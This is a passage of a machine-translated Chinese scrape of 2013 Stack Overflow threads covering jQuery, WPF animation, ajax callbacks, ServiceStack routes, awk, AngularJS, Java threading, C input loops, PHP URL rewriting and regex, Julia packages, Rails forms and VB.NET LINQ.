> 时间：2013-03-27T03:55:17.293

对于 n 级层次结构

```
var str = '{"countries":[{"name":"USA","grandfathers":[{"gFName":"Steve","grandfathersKid":[{"gFKName": "Linda","kid": [{"name": "Steve JR", "friends": [{"name": "Kriss|John|Martin|Steven"}]}]}]}]}]}';
var obj = jQuery.parseJSON(str);
parseJsonString(obj); 
```

功能 ：

```
function parseJsonString(data){       
    $.each(data, function(index, val){

        if($.type(val) == 'object' || $.type(val) == 'array'){
            product.parseJsonString(val);
        }else{
            alert(index + ' - ' + val);
        }

    });
} 
```

# wpf - 如何在 WPF 中淡入和淡出三次？

> ID：15650963
> 
> 赞同：0
> 
> 时间：2013-03-27T02:29:48.840
> 
> 标签：wpf, xaml

我想在 WPF 中淡入和淡出三次。这是我的来源：

```
<Image Height="274" HorizontalAlignment="Left" Margin="307,6,0,0" Name="image1" Stretch="Fill" VerticalAlignment="Top" Width="469" Source="/Makeatest;component/iPhone_20.jpg">
            <Image.Triggers>
                <EventTrigger RoutedEvent="Window.Loaded">
                    <BeginStoryboard>
                        <Storyboard>
                            <DoubleAnimation Storyboard.TargetName="image2"
                                             Storyboard.TargetProperty="Opacity" From="0" To="1" 
                                             Duration="0:0:1" BeginTime="0:0:0" AutoReverse="True" 
                                             RepeatBehavior="Forever"/>
                            <DoubleAnimation Storyboard.TargetName="image3"
                                             Storyboard.TargetProperty="Opacity" From="1" To="0" 
                                             Duration="0:0:1" BeginTime="0:0:0" AutoReverse="True" 
                                             RepeatBehavior="Forever"/>
                        </Storyboard>

                    </BeginStoryboard>
                </EventTrigger>
            </Image.Triggers>
        </Image>
        <Image Height="274" HorizontalAlignment="Left" Margin="307,6,0,0" Name="image2" Stretch="Fill" VerticalAlignment="Top" Width="463" Source="/Makeatest;component/iPhone_3.jpg"/>

        <Image Height="274" HorizontalAlignment="Left" Margin="307,6,0,0" Name="image3" Stretch="Fill" VerticalAlignment="Top" Width="463" Source="/Makeatest;component/삼성8-02.jpg"/> 
```

我想淡入淡出三张图片。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T03:14:01.523

```
 <DoubleAnimation Storyboard.TargetName="image2"
                  Storyboard.TargetProperty="Opacity" From="0" To="1" 
                  Duration="0:0:1" BeginTime="0:0:0" AutoReverse="True" 
             -->  RepeatBehavior="3x"/> <-- 
```

# javascript - 回调时的ajax查询错误

> ID：15650970
> 
> 赞同：0
> 
> 时间：2013-03-27T02:30:20.377
> 
> 标签：javascript, node.js, jquery

```
$(this).find(':submit').attr('disabled',true);
        $.ajax(
        {
            url:'/enviarSugerenciaMessageBoard',
            cache: false,
            type: 'POST',
            data: $(this).serialize(),
            success: function(success)
            {
                if(success=='Envio correcto')
                {
                    console.log('Envio correcto');
                    $(this).find(':submit').attr('disabled',false);
                }else{
                    console.log('Error en el envio');
                    $(this).find(':submit').attr('disabled',false);
                }
            }
        }); 
```

这个 ajax 查询工作正常问题是当我从服务器获得“Envio Correcto”时，在控制台中我得到 Envio Correcto 但 attr disabled false 不起作用......

我尝试在成功时创建其他功能，例如附加或前置，但没有用

即使在 async:false

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:41:26.617

在`success`回调内部，`this`不是你调用的地方`.ajax()`。要控制`this`回调内部的值，可以使用`context`选项`.ajax()`

在您的情况下，您需要做的就是：

```
$.ajax({
    context: this, // what you wnat `this` to be inside success
    url:'/enviarSugerenciaMessageBoard',
    ...
    success: function(success) {
        // 'this' is what you passed in via context
    }); 
```

文档：[http](http://api.jquery.com/jQuery.ajax/) ://api.jquery.com/jQuery.ajax/ - 向下滚动查看`context`选项

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T02:34:04.107

因为`this`关键字在成功函数中不再属于该元素。您应该将此变量备份到另一个变量，而不是使用它。

像这样，

```
$(this).find(':submit').attr('disabled',true);
var self = this;
        $.ajax(
        {
            url:'/enviarSugerenciaMessageBoard',
            cache: false,
            type: 'POST',
            data: $(this).serialize(),
            success: function(success)
            {
                if(success=='Envio correcto')
                {
                    console.log('Envio correcto');
                    $(self).find(':submit').attr('disabled',false);
                }else{
                    console.log('Error en el envio');
                    $(self).find(':submit').attr('disabled',false);
                }
            }
        }); 
```

# servicestack - 路由上的默认值异常

> ID：15650973
> 
> 赞同：3
> 
> 时间：2013-03-27T02:30:41.547
> 
> 标签：servicestack

我有一个定义了以下路线的 Dto

```
 [Route("/route/{Id}/{Status}")]
        public class JustIdAndStatus : IReturn {
            public long Id { get; set; }
            public long Status { get; set; }
        } 
```

然后我用类似的东西调用服务

本地主机：9040/route/1/100

或者

本地主机：9040/route/0/100

一切顺利。

但是当我使用其中一个服务客户端时，如果任何值为 0（long 的默认值），则会出现异常。

```
 var client = new JsonServiceClient("http://127.0.0.1:9040");

   var request = new JustIdAndStatus() {
                    Id = 0,
                    Status = 1
                };

   var response = client.Get(request); 
```

我得到的例外是

```
System.InvalidOperationException : None of the given rest routes matches 'JustIdAndStatus' request:
    /route/{Id}/{Status}:   Could not match following variables: Id
   at ServiceStack.ServiceClient.Web.UrlExtensions.ToUrl(IReturn request, String httpMethod, String formatFallbackToPredefinedRoute) in UrlExtensions.cs: line 65
   at ServiceStack.Common.Tests.UrlExtensionTests.Can_create_url_with_JustIdAndStatus(Int64 id, Int64 status) in UrlExtensionTests.cs: line 91 
```

[我在服务堆栈存储库https://github.com/ServiceStack/ServiceStack/commit/b34a5906a265da19d916ea47ee80783bd866abcb](https://github.com/ServiceStack/ServiceStack/commit/b34a5906a265da19d916ea47ee80783bd866abcb)上跟踪了此提交的问题

我注意到当我从 nuget 从 ServiceStack 3.9.38 更新到 3.9.40 时。

我想知道这种行为是否正确，所以我以错误的方式使用了路由，或者这可能是一个问题，可以提交给 github 上的问题跟踪器。

我还使用在 ServiceStack.Commons 源代码中找到的基本测试进行了测试

[https://gist.github.com/anonymous/5216727](https://gist.github.com/anonymous/5216727)

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T21:33:17.287

我同意您的观点，您所描述的应该是路由中特别引用该属性的预期行为。

您提到的提交旨在禁止在成员被降级为查询字符串的路由上使用默认参数值。但是，它似乎也导致了您使用显式路由描述的问题。

我正在整理一个拉取请求来解决这个问题并添加一些测试来反映预期的行为。

# awk - awk 输入文件中第一个和第二个字段相同的所有行

> ID：15650974
> 
> 赞同：-1
> 
> 时间：2013-03-27T02:30:44.237
> 
> 标签：awk, field, matching

我有时间在这里完成以下任务。我需要打印第一个字段与第二个字段匹配的输入文件的所有行。这是我的语法，显然不起作用： awk '$1==$2 {print $0}' < inputfile, 有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:34:05.620

第三个字段是`$3`，不是吗？

```
awk '$1==$3' inputfile 
```

（既然我们在这里，您可以删除`print $0`隐含的 ，以及`<`重定向。）

# javascript - 如何使用 Angular JS 获取 json 数据并构造模态

> ID：15650975
> 
> 赞同：2
> 
> 时间：2013-03-27T02:30:51.160
> 
> 标签：javascript, angularjs, modal-dialog

当我单击查看详细信息按钮时，我想请求 JSON 数据，然后在内容上构建一个模式视图。

HTML：

```
<a href="#">View Details 1</a>
<a href="#">View Details 2</a>
<a href="#">View Details 3</a> 
```

获取 JSON：

```
function MyCtrl($scope){
      $http.get('json/story.json').success(function(data){
        console.log(data);
        $scope.story = data;
    });
} 
```

当用户单击详细信息按钮时，使用 angular.js 运行此 MyCtrl 函数的最佳实践是什么？上面的 HTML 也正在使用另一个控制器打印出来。我希望有一些方法可以在链接中绑定点击与硬编码 ID 等。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-27T02:53:23.317

您可以像这样调用控制器中的方法：

```
<a href="#" ng-click="getDetails()">View Details</a> 
```

然后在控制器中：

```
$scope.getDetails = function() {
    $http.get(...).success(function(data){
        $scope.story = data;
    });
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T02:54:55.417

将您的服务器通信代码（即 $http 的东西）放入[Angular 服务](http://docs.angularjs.org/guide/dev_guide.services.understanding_services)中。将该服务注入显示您的 HTML 的控制器和与您的模态视图关联的控制器（如果有的话）。

让您的链接调用控制器上的函数，这些函数将与服务交互以获取数据。让您的模态控制器 $watch 数据。

```
<div ng-controller="MyCtrl">
<a href="" ng-click="getDataset1()">View Details 1</a> 
```

控制器：

```
function MyCtrl($scope, myService) {
   $scope.getDataset1 = function() {
       myService.getDataset1();  // populates myService.modalData
   };
}

function ModalCtrl($scope, myService) {
   $scope.showModal = false;
   $scope.$watch(myService.modalData, function(data) {
      $scope.modalData = data;
      $scope.showModal = true;
   });
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T06:51:15.613

`$timeout`可以在此处看到使用异步数据进行 CRUD 编辑的完整示例（此处通过 模拟）： [http ://plnkr.co/edit/EAabx4?p=preview](http://plnkr.co/edit/EAabx4?p=preview)

它使用`$dialog`来自[http://angular-ui.github.com/bootstrap/](http://angular-ui.github.com/bootstrap/)存储库的服务。此示例使用 Bootstrap 的 CSS，但模板是完全可定制的。

该`$dialog`服务的好处在于它可以与 AngularJS 承诺一起工作，因此您不必将内容复制到范围，使用手表等。

# java - 如何立即更新线程之间的共享变量

> ID：15650978
> 
> 赞同：2
> 
> 时间：2013-03-27T02:31:14.230
> 
> 标签：java, multithreading, asynchronous, concurrency

我的测试程序要求输入一个字符串并每 2 秒打印一次。我已经阅读了一些关于 java 内存模型或线程如何不立即更新主内存上的变量的内容。

我已经尝试过`volatile`和`static`属性。`line`同步修改变量的代码块。`wait()/notifi()`何时更改变量以及其他一些。如何分配`line`为参考而不是价值？我是否使用了我尝试错误的方法？为什么对象在充当监视器时可以保持完美同步，而在充当指针时却不能？

```
public class TestSharedVariable {
    static String line= "";

    public static void main(String[] args) {
        // For reading from keyboard
        Scanner keyboard = new Scanner(System.in);

        Printer p = new Printer(line);
        p.start();

        // Reads a line from keyboard into the shared variable
        while(!line.equals("quit")){
            line = keyboard.nextLine(); 

        }
    }
}

class Printer extends Thread{
    private volatile String line;

    public Printer(String palabra){
        this.line = palabra;
    }

    /*  Prints the line each 2 sec  */
    @Override
    public  void run(){
        while(!line.equals("quit")){
            try {
                sleep(2000);
            } catch (InterruptedException e) {e.printStackTrace();}
            System.out.println(this.getName() + ": " + line);
        }
    }
} 
```

输出：

```
 Thread-0: 
    asdf
    Thread-0: 
    Thread-0: 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T02:34:28.640

你有两个主要问题：

*   一方面，字符串是不可变的，因此您无法更改字符串变量的状态，例如组成它的字符，一旦它被创建，并且
*   您将两个引用变量分配给同一个对象，但希望一个变量在另一个变量的分配更改时更改其分配，这不是 Java 引用变量的工作方式。

换句话说，即使您最初将 Printer 对象的行变量设置为与 TestSharedVariable 的静态行变量相同的引用，但稍后更改 TestSharedVariable 的静态行变量的引用对打印机行变量的引用分配没有影响。这与线程无关，与理解引用变量有关。想想引用变量，如 C 或其他类似语言中的指针。如果两个变量指向同一个对象，将一个变量更改为指向不同的对象对第一个变量没有影响。

为了使您的代码正常工作，两个变量必须共享对同一个可变对象的引用，并且您必须更改可变对象的*状态*，而不是对其的*引用*。

例如，

```
import java.util.Scanner;

public class TestSharedVariable {
   static volatile MutableObject mutableObject = new MutableObject();

   public static void main(String[] args) {
      // For reading from keyboard
      Scanner keyboard = new Scanner(System.in);

      Printer p = new Printer(mutableObject);
      new Thread(p, "Print thread").start();

      // Reads a line from keyboard into the shared variable
      while (!mutableObject.getData().equals("quit")) {
         mutableObject.setData(keyboard.nextLine());

      }
   }
}

class Printer implements Runnable {
   private volatile MutableObject mutableObject;

   public Printer(MutableObject mutableObject) {
      this.mutableObject = mutableObject;
   }

   /* Prints the line each 2 sec */
   @Override
   public void run() {
      while (!mutableObject.getData().equals("quit")) {
         try {
            Thread.sleep(2000);
         } catch (InterruptedException e) {
            e.printStackTrace();
         }
         Thread thread = Thread.currentThread();
         System.out.println(thread.getName() + ": " + mutableObject);
      }
   }
}

class MutableObject {
   private String data = "";

   public String getData() {
      return data;
   }

   public void setData(String data) {
      this.data = data;
   }

   @Override
   public String toString() {
      return data;
   }

} 
```

# c - 将 if 语句与 for 循环和数组一起使用时遇到问题

> ID：15650982
> 
> 赞同：-1
> 
> 时间：2013-03-27T02:31:50.827
> 
> 标签：c, arrays, for-loop

我的一项职能有问题。这是代码：

```
include <stdio.h>
include <math.h>
include <stdlib.h>

int inputAmount(int i);

void inputFahrs(double data[ ], int j);

double fahrToCels (double data[ ], int j);

void  outputFahrs(double data [ ], int numFahrs);

void outputAverage(double data[ ], int numFahrs);

void outputHighLows(double data[ ], int numFahrs);

void outputGrads(double data[ ], int numFahrs);

int main (void)
{
    int i, j, numFahrs;
    double data[i], *ptr=&data[i];
    i=inputAmount(i);
    printf("%d\n\n", i);
    inputFahrs(&data[i], i);
    data[j]=fahrToCels(&data[i], j);
    printf("%.1f", data[j]); 
    return 0;
}

int inputAmount(int i)
{
    printf("Please enter the amount of vaues you would like to use.\n\n");
    scanf("%d", &i);
    while(i<1 || i>25)
    {
        printf("Value is out of range. Please enter another value.\n\n");
        scanf("%d", &i);
    }       
    return i;
}   

void inputFahrs(double data[ ], int i)
{
    int j;
    printf("Please enter temperature values in the range of -175 to 175 degrees F.\n\n");
    for(j=0;j<i;j++)
    {
        scanf("%f", &data[j]);
        if (data[j]< -175 || data[j]>175)
        {
            printf("Temperature value is out of range. Please re-enter");
            scanf("%f", &data[j]);
        }
    }       
}

double fahrToCels (double data[ ], int j)
{
    int i;
    printf("TEST");
    for(j=1;j<=i;j++)
    {
        data[i]=(((data[i])-32)*(5.0/9.0));
    }
    return data[i];
} 
```

基本上我的代码中的问题是它`if`完全跳过了该语句。我希望程序通过`for`循环，如果用户输入的值超出范围，我希望`if`语句开始。`for`循环内的打印语句，但在`if`语句之后工作正常，所以这肯定是有问题的。我还尝试了一个`while`循环来代替`if`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:59:28.087

```
void inputFahrs(float data[],int i)
{
    int j;
    printf("Please Enter values in the range of -175 to 175\n");
    for(j=0;j<i;j++)
    {
            scanf("%f",&data[j]);
            if(data[j]<-175 || data[j]>175)
            {
                    printf("value is out of range. Enter correct value\n");
                    j--;
            }
    }
} 
```

这个很好用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:35:36.270

问题是你正在迭代循环

> j

并用下标检查条件

> 一世

使用 j 作为下标将起作用

> scanf("%f",&data[ j ])
> 
> 如果（数据[j]<-175]||数据[j]>175）

应该管用。因为 data[i] 不是可能的下标值，因为 i 是数组大小

你为什么用这条线

```
data[i]=data[i]; 
```

?

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-27T02:36:23.303

我猜这是因为您正在使用`i`索引扫描和存储数据，索引是传递给函数的数组的大小，而不是当前元素的索引，它存储在`j`. 它应该是：

```
 scanf("%f", &data[j]);
   .. 
```

另外，为什么要在 for 循环中进行比较`j <= i - 1`？`j < i`听起来更简单。

# php - PHP Href 处理/重写

> ID：15650987
> 
> 赞同：0
> 
> 时间：2013-03-27T02:32:07.443
> 
> 标签：php, url-rewriting, href

我有 .htaccess 设置，可以将任何内容重写为 index.php 以制作静态 url。例如：

`RewriteRule ^(.*)$ index.php?/$1 [L]`

`url: www.domain.com/home/article/news/`

我对这种重写没有任何问题，我可以使用`$_SERVER['REQUEST_URI']`. 但是，我的链接有问题。例如：

`<a href="home/article/recent">Recent News</a>`

当我单击此链接时，网址将是`www.domain.com/home/article/news/home/article/recent`因为 href 值不是以`"/"`.

有什么方法可以用 php 或 .htaccess 重写我的链接？所以当我忘记`"/"`输入href时，它不会跟随当前的url？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:42:07.070

**.htaccess 不会轻易帮助您。**我会说当您添加新路径时，它将容易出错并且难以维护。如果你想走那条路，你应该做 301，这样你的用户就不会看到那些奇怪的路径。不幸的是，这会增加重定向的延迟。

**对于 PHP，这取决于您如何生成输出。**我会说这是可能的，但你必须生成链接而不是将其输出为直接的 HTML，这会变成丑陋的 IMO。

**简单地使用绝对路径当然要少得多，并且很快就会成为一种习惯。**

# julia - Julia：添加包的问题 (BinDeps)

> ID：15650988
> 
> 赞同：8
> 
> 时间：2013-03-27T02:32:13.883
> 
> 标签：julia

我是 Julia 包管理器的新手，在安装 GLPK 和 LinProgGLPK 时遇到问题。
我已经运行`Pkg.Init()`并使用`Pkg.add("Curl")`. 但是，当我尝试安装 GLPK 或 LinProgGLPK（使用`Pkg.add("GLPK")`and`Pkg.add("LinProgGLPK"))`时，我收到以下消息：

```
MESSAGE: Installing BinDeps v0.0.0
ERROR: Path BinDeps already exists! Please remove to allow installation.
 in _resolve at pkg.jl:345
 in anonymous at no file:163
 in cd at file.jl:26
 in cd_pkgdir at pkg.jl:42
 in add at pkg.jl:143
 in add at pkg.jl:175 
```

对于依赖 BinDeps 的其他软件包（包括 Winston），我似乎得到了相同的消息。

我曾尝试调用`Pkg.rm("BinDeps")`、`Pkg.add("BinDeps")`、`Pkg.update()`和`Pkg.resolve()`，然后返回尝试添加 GLPK，但同样的消息仍然存在。我也输入`~/.julia`了删除 BinDeps 文件夹，但这也不起作用。我错过了什么？

PS 我在 Linux Ubuntu 中运行 julia。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-28T00:24:17.953

老实说，当事情搞砸时，最好只是擦除 ~/.julia 并重新添加包。

只需确保备份本地更改！

# ruby-on-rails - f.select 中 Rails 中的参数数量错误（3 为 2）

> ID：15650991
> 
> 赞同：0
> 
> 时间：2013-03-27T02:32:23.550
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我有这个多重选择列表，它给了我一个错误错误数量的参数（3 对 2）在 form_form 一个“主题”模型，它有 _many :curriculums, :through => another_model

```
 <%= f.select :curriculum_ids, options_from_collection_for_select(Curriculum.all, :id, :name, @topic.curriculum_ids), {}, { "data-placeholder"=>"Select Curriculum", :multiple=>true , :class=>"chzn-select"} %> 
```

然而，这段代码在另一个控制器的视图中工作得很好：

这里我们有一个带有 has_and_belongs_to_many 的 Question 模型：skills

```
<%=f.select :skill_ids, options_from_collection_for_select(Skill.all, :id, :name, @question.skill_ids),{},{"data-placeholder"=>"Select Other Skills",:multiple=>true,:class=>"chzn-select"}%> 
```

这是完整的 _form.html.erb ：

```
<div class="row-fluid attributeContainer">
  <div class="span12">
    <% if @topic.errors.any? %>
    <% @topic.errors.full_messages.each do |msg| %>
    <div class="alert alert-error">
      <button class="close" data-dismiss="alert">×</button>
      <strong>Error!</strong> <%= msg %>
    </div>
    <% end %>
    <% end %>

    <div class="widget-box">
      <div class="widget-title">
        <span class="icon">
          <i class="icon-align-justify"></i>
        </span>
        <h5>Topics</h5>
      </div>

      <div class="widget-content nopadding">
        <%= form_for(@topic,:html=>{:class=>"form-horizontal"}) do |f| %>

        <div class="control-topic">
          <label class="control-label">Topic Name</label>
          <div class="controls">
            <%= f.text_field :name %>
          </div>
        </div>

        <div class="control-group">
          <label class="control-label">Description</label>
          <div class="controls">
            <textarea name="topic[description]" value="<%=@topic.description%>"><%=@topic.description%></textarea>
          </div>
        </div>

        <div class="control-group">
            <label class="control-label">Subject</label>
            <div class="controls">
              <div class="span3">
                <%= f.collection_select(:subject_id, Subject.all, :id, :name, {:include_blank => 'Please Select Subject'}) %>
              </div>
            </div>
        </div>

        <div class="control-group">
            <label class="control-label">Curriculum</label>
            <div class="controls">
              <div class="span3">
                <%= f.select :curriculum_ids, options_from_collection_for_select(Curriculum.all, :id, :name, @topic.curriculum_ids), {}, { "data-placeholder"=>"Select Curriculum", :multiple=>true , :class=>"chzn-select"} %>
              </div>
            </div>
        </div>

       <div class="control-group attributeTemplate2" style="display:none;">
        <label class="control-label">Concept Tag</label>
        <div class="controls" >
          <div class="span3" >
            <%= f.collection_select(:name, Concept.all,:id, :name,{:include_blank => 'Please Select'},{:name=>"topic[concept][][concept_id]"}) %>
          </div>
          <div class="span2">
            <%= f.text_field :name, :style=> "margin-left:25px;", :class=>'text_field', :name=>'topic[concept][][concept_sequence]', :placeholder=>'concept_sequence', :size=>'30'%>
          </div>
          <div>
            <a style="margin-left:25px;" class="btn btn-danger removeRow"><i class="icon-white icon-remove-sign"></i></a>
          </div>
        </div>
      </div>

      <div class="control-group ">
        <label class="control-label">Concept Tag</label>
        <div class="controls" >
          <div class="span3" >
            <%= f.collection_select(:name, Concept.all,:id, :name,{:include_blank => 'Please Select'},{:name=>"topic[concept][][concept_id]",:class=>"chzn-select"}) %>
          </div>
          <div class="span2">
            <%= f.text_field :name, :style=> "margin-left:25px;", :class=>'text_field', :name=>'topic[concept][][concept_sequence]', :placeholder=>'concept_sequence', :size=>'30'%>
          </div>
          <div>
            <a style="margin-left:25px;" class="btn btn-danger removeRow"><i class="icon-white icon-remove-sign"></i></a>
          </div>
        </div>
      </div>

      <div class="control-group addTopicConcepts">
        <div class="controls" >
          <div><a class="btn btn-primary">Add Concept</a></div>
        </div>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Save</button>
      </div>
      <%end%>
    </div>
  </div>
</div>
</div> 
```

**代码固定：**

显然连接模型有代码：

```
belongs_to :curriculum , :grade,  :topic 
```

更改为代码修复了一切。

```
 belongs_to :curriculum
  belongs_to :grade
  belongs_to :topic 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:39:48.553

为什么不使用collection_select？

[http://api.rubyonrails.org/classes/ActionView/Helpers/FormOptionsHelper.html#method-i-collection_select](http://api.rubyonrails.org/classes/ActionView/Helpers/FormOptionsHelper.html#method-i-collection_select)

在form_for中使用时参数如下

第一个参数是您希望将值记录到的字段的名称（例如：curriculum_id）第二个参数是您希望从中收集项目的模型（例如 Curriculum.all）第三个参数是您要记录值的字段（例如：id）第四个参数是您希望显示为值的字段（例如：name）

所以对于你的例子

```
<%= f.collection_select :curriculum_id, Curriculum.all, :id, :name, { "data-placeholder"=>"Select Curriculum", :multiple=>true , :class=>"chzn-select"} %> 
```

应该近似于您想要的，尽管您可能需要对其进行调整。

# vb.net - 使用 Linq 添加到变量的错误代码

> ID：15650992
> 
> 赞同：0
> 
> 时间：2013-03-27T02:32:48.367
> 
> 标签：vb.net, linq

我将从问题开始，然后描述该过程的工作原理。

我收到一条错误消息：

> “System.Collections.Generic.IEnumerable(Of LunchMoneyGame.LunchMoneyMainForm.Group)”类型的值无法转换为“LunchMoneyGame.LunchMoneyMainForm.Group”。

指出问题的蓝色下划线`Dim obj As LunchMoneyGame.LunchMoneyMainForm.Group = From r In temp Where r.ID = Number Select r`位于操作员的右侧。

我知道这与明确性有关

--

这是我正在转换为文本游戏的桌面纸牌游戏。

此子程序的目标是从玩家手中减去一张牌并将其添加到弃牌堆中。一旦添加到弃牌堆，我就会调用弃牌堆，将牌从弃牌堆移到牌堆。

问题从数字生成器开始。我正在做的是从牌组中随机挑选一张牌。通过生成卡片组中卡片的卡片 ID。使用 linq 生成 ID 后，生成的数字然后拿一张卡片，然后将卡片添加到玩家库存（数量整数），并从牌组中减去。

T 代表轮到谁了。目前，出于测试目的，我仅根据 T 变量为 2 名玩家编写了代码。

```
 Private Sub GrabFromDeckAndDiscard()
        Dim CardCheckBoxInteger As Integer
        'ReDeclare CheckBox Array for Private sub
        Dim CardCheckBoxArray() As CheckBox = {CardCheckBox1, CardCheckBox2, CardCheckBox3, CardCheckBox4, CardCheckBox5}
        'Discard
        Select Case T
            Case 0
                Player1HandGroup(NumberArray(Checks)).QuantityInteger -= 1
            Case 1
                Player1HandGroup(NumberArray(Checks)).QuantityInteger2 -= 1
            Case 2
                Player1HandGroup(NumberArray(Checks)).QuantityInteger3 -= 1
            Case 3
                Player1HandGroup(NumberArray(Checks)).QuantityInteger4 -= 1
            Case 4
                Player1HandGroup(NumberArray(Checks)).QuantityInteger5 -= 1
        End Select
        'Add Card to Discard Pile
        DiscardGroup(NumberArray(Checks)).QuantityInteger += 1
        'Shuffle Deck from Discard Pile if Deck is out of cards
        Call DiscardPile()
        'Reset Number Generator, unless weapon isn't discard
        Dim temp As IEnumerable(Of LunchMoneyGame.LunchMoneyMainForm.Group) = From r In DeckGroup Where r.QuantityInteger > 0 Select r

        If temp IsNot Nothing AndAlso temp.count > 0 Then
            Number = (temp(Rnd.Next(0, temp.Count)).ID)
            ' ** Edit **: This will give you the actual object to be manipulated
            Dim obj As LunchMoneyGame.LunchMoneyMainForm.Group = (From r In temp Where r.ID = Number Select r).Single

            Dim PlayerQuantitySubtractionInteger As Integer
            For PlayerQuantitySubtractionInteger = ChecksDynamicA To ChecksDynamicB
                ' ** Edit **
                obj.QuantityInteger -= 1
                'Select the Player depending value of T
                Select Case T
                    Case 0
                        Player1HandGroup(Number).QuantityInteger += 1
                    Case 1
                        Player1HandGroup(Number).QuantityInteger2 += 1
                    Case 2
                        Player1HandGroup(Number).QuantityInteger3 += 1
                    Case 3
                        Player1HandGroup(Number).QuantityInteger4 += 1
                    Case 4
                        Player1HandGroup(Number).QuantityInteger5 += 1
                End Select
                CardTypeArray(PlayerQuantitySubtractionInteger) = Player1HandGroup(Number).CardType
                CardCheckBoxArray(TextBoxInteger).Text = Player1HandGroup(Number).CardNameString
                NumberArray(PlayerQuantitySubtractionInteger) = Number
            Next PlayerQuantitySubtractionInteger
        End If

        'Switch to next player
        Select Case T
            Case 0
                For CardCheckBoxInteger = 0 To 4
                    CardCheckBoxArray(CardCheckBoxInteger).Text = Player1HandGroup(NumberArray(CardCheckBoxInteger + 5)).CardNameString
                Next
                T += 1
            Case 1
                If GameSize = 2 Then
                    For CardCheckBoxInteger = 0 To 4
                        CardCheckBoxArray(CardCheckBoxInteger).Text = Player1HandGroup(NumberArray(CardCheckBoxInteger)).CardNameString
                    Next CardCheckBoxInteger
                    T -= 1
                End If
                If GameSize > 2 Then
                    T += 1
                End If
            Case 2
            Case 3
            Case 4

        End Select
        Label1.Text = T.ToString

        'Clear Check Boxes when turn is finished
        For CardCheckBoxInteger = 0 To 4
            CardCheckBoxArray(CardCheckBoxInteger).Checked = False
        Next

        'Turn off play button
        PlayButton.Enabled = False
    End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:39:35.087

```
From r In temp 
Where r.ID = Number 
Select r 
```

`Where`返回与子句匹配的所有内容的集合（参见[MSDN](http://msdn.microsoft.com/en-us/library/bb534803.aspx)文档）。.NET 将其表示为 IEnumerable，这意味着可以迭代的事物的集合（例如，使用`For`循环或类似的东西）。

没有自动的概念，即使您的条件是，您也只会返回一条记录`=`（广义上，也可能存在不返回任何元素的条件，例如当没有任何内容与相等条件匹配或多个事物与相等条件匹配时）。

为了表明您只需要一个元素，您可以使用[First](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.first.aspx)、[Single](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.single.aspx)、[FirstOrDefault](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.firstordefault.aspx)或[SingleOrDefault](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.singleordefault.aspx)方法。

例如：

```
 Dim obj As LunchMoneyGame.LunchMoneyMainForm.Group = (From r In temp Where r.ID = Number Select r).Single() 
```

这会给你一个 type 的对象`LunchMoneyGame.LunchMoneyMainForm.Group`，我认为你在这种情况下正在寻找它。

顺便说一句，了解我上面概述的方法之间的区别也不错。以我的外行观点（因为我不是专家）：

*   `First`返回集合中的第一项，如果集合为空，则抛出异常
*   `FirstOrDefault`返回集合中的第一项，如果为空，则返回 null
*   `Single`返回集合中唯一的项目，如果集合中没有一个项目，则抛出异常
*   `SingleOrDefault`返回集合中的第一项，如果集合为空，则返回 null，如果集合有超过 1 个元素，则抛出异常

所以在你的情况下，因为你应该只在一个项目上匹配`=`我建议使用的条件`Single`或`SingleOrDefault`

**PS。**抱歉，当我`null`在上面说时，那将是`Nothing`在 VB.NET 中说的

# php - PHP 匹配 URL 和使用 preg_replace_callback()

> ID：15650994
> 
> 赞同：1
> 
> 时间：2013-03-27T02:33:18.963
> 
> 标签：php, regex, preg-replace, preg-replace-callback

我使用以下内容查找 $content 中的所有 URL

```
 $content = preg_match_all( '/(http[s]?:[^\s]*)/i', $content, $links ); 
```

但这将取决于`http://`.`http://www.google.com/some/path`

我的问题是：

1 - 我怎样才能修改它以点击仅以开头的链接`www`，例如`www.google.com`？

2 - 主要目的是找到链接，并将它们替换为从另一个函数返回的值。我尝试了 preg_match_callback() ，但它不起作用（可能使用错误..

```
$content = preg_replace_callback(
           "/(http[s]?:[^\s]*)/i",
            "my_callback",
            $content);

function my_callback(){

// do a lot of stuff independently of preg_replace
// adding to =.output...

return $output;
} 
```

现在，在我的逻辑（这可能是错误的）中，所有匹配项`$content`都将替换为`$output`. 我究竟做错了什么 ？

（请不要使用匿名函数 - 我正在旧服务器上测试）

**编辑我**- 在评论后，试图澄清更多细节

```
function o99_simple_parse($content){

$content = preg_replace_callback( '/(http[s]?:[^\s]*)/i', 'o99_simple_callback', $content );

return $content;
} 
```

打回来 ：

```
function o99_simple_callback($url){
    // how to get the URL which is actually the match? and width ??
        $url = esc_url_raw( $link );
        $url_name = parse_url($url); 
        $url_name = $description = $url_name['host'];// get rid of http://..
        $url = 'http://something' .  urlencode($url)   . '?w=' . $width ; 
        return $url; // what i really need to replace 
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T02:54:44.857

要修改您已经必须允许以 开头的 URL 的正则表达式`www`，您只需编写以下代码：

```
/((http[s]?:|www[.])[^\s]*)/i
  +         ++++++++ 
```

# c# - WPF 画布中超过 200 万个矩形

> ID：15650995
> 
> 赞同：2
> 
